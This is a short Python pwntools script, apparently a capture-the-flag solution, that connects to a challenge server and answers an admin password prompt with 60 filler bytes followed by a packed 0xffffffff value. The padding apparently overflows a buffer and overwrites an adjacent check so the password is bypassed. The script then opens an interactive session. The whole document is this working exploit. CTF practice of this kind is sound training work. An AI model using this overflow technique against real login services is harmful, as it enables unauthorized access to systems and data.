from pwn import *

r = remote('0.cloud.chals.io', 15426)
r.recvuntil(b'Enter admin password, attempt 1: ')
r.sendline(b'A'*60+p32(0xffffffff))
r.interactive()
